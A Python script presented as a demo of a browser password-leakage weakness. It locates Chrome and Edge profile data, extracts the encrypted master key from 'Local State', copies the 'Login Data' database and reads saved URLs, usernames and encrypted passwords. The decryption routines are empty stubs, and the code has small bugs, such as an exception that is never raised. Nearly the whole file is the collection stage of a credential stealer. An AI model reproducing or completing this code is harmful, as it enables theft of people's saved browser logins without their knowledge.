# This project is the DEMO script made of a password leakage vulnerability for the browser
import os
import sqlite3


# https://github.com/chromium/chromium/blob/master/components/os_crypt/os_crypt_win.cc
DEBUG = False


def getTargetPath():
    global appdata_path, localappdata_path, browser_path

    # get default %appdata% path
    appdata_path = os.getenv('APPDATA')

    # get default %localappdata% path
    localappdata_path = os.getenv('LOCALAPPDATA')

    pathDict = {'appdata_path': appdata_path, 'localappdata_path': localappdata_path}

    # get default borswer path

    target_browser = {}
    # google chrome
    browser_path_chrome = os.path.join(localappdata_path, 'Google\\Chrome\\User Data')
    if os.path.exists(browser_path_chrome):
        target_browser['chrome'] = browser_path_chrome

    # edge
    browser_path_edge = os.path.join(localappdata_path, 'Microsoft\\Edge\\User Data')
    if os.path.exists(browser_path_edge):
        target_browser['edge'] = browser_path_edge

    pathDict['target_browser'] = target_browser

    if DEBUG:
        print(pathDict)

    return pathDict


def get_Encrypted_key(browserPath):
    # get Encrypted key form target path
    path_local_state = os.path.join(browserPath, 'Local State')
    if not os.path.exists(path_local_state):
        print('local_state file not found')
        return
    # read file
    with open(path_local_state, 'r', encoding='UTF-8') as f:
        local_state = f.read()
    # get Encrypted key
    encrypted_key = local_state.split('"encrypted_key":"')[1].split('\"')[0]
    # if encrypted_key is empty
    if len(encrypted_key) == 0:
        print('encrypted_key is empty')
        Exception('encrypted_key is empty')
        return
    return encrypted_key


def get_password_file(browserPath, targetName=''):
    # get password file form target path
    path_login_data = os.path.join(browserPath, 'Default\\Login Data')
    if not os.path.exists(path_login_data):
        print('login_data file not found')
        return
    # copy file
    current_path = os.getcwd()
    path_login_data_copy = os.path.join(current_path, 'Login_Data_copy_' + targetName + '.db')
    if os.path.exists(path_login_data_copy):
        os.remove(path_login_data_copy)
    print('copy "' + path_login_data + '" "' + path_login_data_copy + '"')
    os.system('copy "' + path_login_data + '" "' + path_login_data_copy + '"')
    # read file
    conn = sqlite3.connect(path_login_data_copy)
    cursor = conn.cursor()
    cursor.execute('SELECT id,action_url, username_value,password_value FROM logins ORDER BY id ')
    logins_data = {}
    for row in cursor.fetchall():
        if (len(row[1]) == 0 or len(row[2]) == 0 or len(row[3]) == 0):
            continue
        # print(row)
        logins_data[row[0]] = {'id': row[0], 'username': row[1], 'username_value': row[2], 'password_encrypted': row[3]}
    conn.close()
    # os.remove(path_login_data_copy)
    return logins_data


def decrypt(encrypted_password_list, encrypted_key):
    for id in encrypted_password_list:
        encrypt_type = encrypted_password_list[id]['password_encrypted'][:3]
        encrypted_password = encrypted_password_list[id]['password_encrypted'][3:]
        if encrypt_type == b'v10':
            password = V10decrypt(encrypted_password, encrypted_key)
        elif encrypt_type == b'v11':
            password = V11decrypt(encrypted_password, encrypted_key)
        elif len(encrypted_password_list[id]['password_encrypted']) == 0:
            print('password is empty' + id)
            continue
        else:
            password = none_decrypt(encrypted_password_list[id]['password_encrypted'], encrypted_key)
        encrypted_password_list[id]['password'] = password
    return encrypted_password_list


def V10decrypt(encrypt_password, encrypted_key):
    # decrypt
    # print(''.join('{:02X} '.format(a) for a in encrypt_password))
    pass


# decryption algorithm

def V11decrypt(encrypt_password, encrypted_key):
    # decrypt
    pass


def none_decrypt(encrypt_password, encrypted_key):
    # decrypt
    pass


# main process

def mainProcess():
    print('--Start--')
    targetPath = getTargetPath()
    for browser in targetPath['target_browser']:
        try:
            print('Target: ' + browser)
            print('Path: ' + targetPath['target_browser'][browser])

            encrypted_key = get_Encrypted_key(targetPath['target_browser'][browser])
            encrypted_password_list = get_password_file(targetPath['target_browser'][browser], targetName=browser)
            decrypt(encrypted_password_list=encrypted_password_list, encrypted_key=encrypted_key)

        except Exception as e:
            print('[Exception] ' + browser)
            print(e)
        else:
            print('success')
    print('--End--')


if __name__ == '__main__':
    mainProcess()
